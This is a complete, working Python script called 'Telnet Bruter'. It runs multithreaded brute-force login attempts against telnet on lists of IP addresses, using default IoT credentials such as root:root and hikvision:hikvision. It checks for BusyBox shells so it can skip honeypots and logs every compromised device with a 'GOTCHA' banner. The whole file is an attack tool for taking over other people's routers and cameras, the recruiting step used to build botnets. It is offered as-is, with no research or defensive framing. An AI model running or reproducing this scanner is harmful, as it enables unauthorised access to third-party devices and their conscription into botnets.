#!/usr/bin/env python3
# Telnet Bruter
import threading
import sys, os, re, time, socket
from queue import Queue
from sys import stdout

if len(sys.argv) < 4:
	print("Usage: python "+sys.argv[0]+" <list> <threads> <output file>")
	sys.exit()

combo = [ 
	"root:",
	"admin:",
	"root:root",
	"admin:admin",
	"user:user",
	"ubnt:ubnt",
	"ubuntu:ubuntu",
	"guest:guest",
	"support:support",
	"default:default",
	"test:test",
	"fake:fake",
	"root:admin",
	"admin:root",
	"root:123",
	"root:1234",
	"root:12345",
	"root:123456",
	"root:changeme",
	"admin:changeme",
	"guest:1234",
	"guest:12345",
	"guest:123456",
	"admin:1234",
	"admin:12345",
	"admin:123456",
	"hikvision:hikvision",
	"root:toor",
	":",
	"operator:operator",
	"ftp:ftp",
	"root:888888",
	"default:",
	"1234:1234"
]

ips = open(sys.argv[1], "r").readlines()
threads = int(sys.argv[2])
output_file = sys.argv[3]
queue = Queue()
queue_count = 0

for ip in ips:
	queue_count += 1
	queue.put(ip)
print("[*] Loaded %d IPs to scan" % queue_count)


class router(threading.Thread):
	def __init__ (self, ip):
		threading.Thread.__init__(self)
		self.ip = str(ip).rstrip('\n')
	def run(self):
		for passwd in combo:
			username = ""
			password = ""
			
			# Parse username and password from combo
			if ":" in passwd:
				parts = passwd.split(":", 1)
				username = parts[0]
				password = parts[1]
			
			# Try to connect and authenticate
			try:
				tn = socket.socket()
				tn.settimeout(8)
				tn.connect((self.ip, 23))
			except Exception:
				try:
					tn.close()
				except:
					pass
				# Connection failed, but continue trying other combos
				continue
			
			try:
				# Wait for login prompt
				hoho = readUntil(tn, "ogin:")
				if "ogin" in hoho:
					tn.send((username + "\n").encode())
					time.sleep(0.09)
				else:
					try:
						tn.close()
					except:
						pass
					continue
			except Exception:
				try:
					tn.close()
				except:
					pass
				continue
			
			try:
				# Wait for password prompt
				hoho = readUntil(tn, "assword:")
				if "assword" in hoho:
					tn.send((password + "\n").encode())
					time.sleep(0.8)
			except Exception:
				try:
					tn.close()
				except:
					pass
				continue
			
			try:
				# Check for successful login
				prompt = tn.recv(40960).decode('utf-8', errors='ignore')
				success = False
				
				if ">" in prompt and "ONT" not in prompt:
					success = True
				elif "#" in prompt or "$" in prompt or "%" in prompt or "@" in prompt:
					success = True
				
				if success:
					# Check if it's a fake telnet/honeypot
					if self.is_fake_telnet(tn):
						try:
							tn.close()
						except:
							pass
						continue
					
					# Real device - Successful login!
					os.system("echo "+self.ip+":23 "+username+":"+password+" >> "+output_file+"")
					print("\033[32m[\033[31m+\033[32m] \033[33mGOTCHA \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m" % (username, password, self.ip))
					try:
						tn.close()
					except:
						pass
					break
				else:
					# Wrong credentials, try next combo
					try:
						tn.close()
					except:
						pass
			except Exception:
				try:
					tn.close()
				except:
					pass
	
	def is_fake_telnet(self, tn):
		"""Check if telnet is fake/honeypot by testing shell commands"""
		try:
			# Try to get shell
			tn.send(b"sh\n")
			time.sleep(0.1)
			tn.send(b"shell\n")
			time.sleep(0.1)
			
			# Send echo test command
			tn.send(b"echo TESTSHELL\n")
			time.sleep(0.5)
			
			response = ""
			try:
				response = tn.recv(8192).decode('utf-8', errors='ignore')
			except:
				return True  # No response = fake
			
			# Check for valid shell response
			if "TESTSHELL" in response:
				# Now check for busybox (real IoT device indicator)
				tn.send(b"busybox\n")
				time.sleep(0.5)
				
				try:
					busybox_response = tn.recv(8192).decode('utf-8', errors='ignore')
				except:
					return True
				
				# Real devices have busybox or show "BusyBox" in output
				if "BusyBox" in busybox_response or "applet" in busybox_response or "built-in" in busybox_response.lower():
					return False  # Real device
				elif "not found" in busybox_response or "command" in busybox_response:
					# Might be real but no busybox, do additional check
					tn.send(b"cat /proc/cpuinfo\n")
					time.sleep(0.3)
					try:
						cpu_response = tn.recv(8192).decode('utf-8', errors='ignore')
						if "processor" in cpu_response.lower() or "model" in cpu_response.lower():
							return False  # Real device
					except:
						pass
					return True  # Likely fake
				else:
					return True  # Suspicious response
			else:
				# No echo response = likely fake/honeypot
				return True
		except:
			return True  # Error = assume fake

def readUntil(tn, string, timeout=8):
	buf = ''
	start_time = time.time()
	while time.time() - start_time < timeout:
		buf += tn.recv(1024).decode('utf-8', errors='ignore')
		time.sleep(0.01)
		if string in buf: return buf
	raise Exception('TIMEOUT!')

def worker():
	try:
		while True:
			try:
				IP = queue.get()
				thread = router(IP)
				thread.start()
				queue.task_done()
				time.sleep(0.02)
			except:
				pass
	except:
		pass

for l in range(threads):
	try:
		t = threading.Thread(target=worker)
		t.start()
	except:
		pass
